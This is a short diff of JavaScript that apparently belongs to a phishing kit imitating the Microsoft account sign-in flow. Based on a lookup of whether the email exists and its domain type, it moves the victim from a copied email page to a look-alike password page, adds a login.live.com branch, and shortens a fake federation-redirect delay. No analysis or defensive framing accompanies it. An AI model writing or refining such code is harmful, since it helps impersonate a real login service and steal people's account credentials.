@@ -108,20 +108,28 @@ $("#load").hide();
 $("#error1").html(Errs['Notemail']);
 
 }else if (vdata["IfExistsResult"]=='6') {
-      await getpage('EmailPage',0); 
+
+getpage('EmailPage',0); 
   await getpage('ChoosenPage',1); 
 $("#load").hide();
+}else if (vdata["IfExistsResult"]=='5') {
+mhost='https://login.live.com?username='+email;
+getpage('EmailPage',0); 
+await getpage('PassPage',1); 
+$("#idBtn_Back").hide();
+$("#load").hide();
 }else{
-    if(vdata["ThrottleStatus"]=="1" && vdata["EstsProperties"]["DomainType"]==4){
+if(vdata["ThrottleStatus"]=="1" && vdata["EstsProperties"]["DomainType"]==4){
+mhost=GetCredential["Credentials"]["FederationRedirectUrl"];
 await getpage('OrgloadPage',1);
 Timeout=setTimeout(async function(){
     await getpage('PassPage',1); 
      $("#idBtn_Back").hide();
-},3000)
+},1000)
     }else{
    await getpage('PassPage',1); 
     }
-  await getpage('EmailPage',0); 
+   getpage('EmailPage',0); 
 if(bac==1){
     $("#idBtn_Back").show();
 }else{
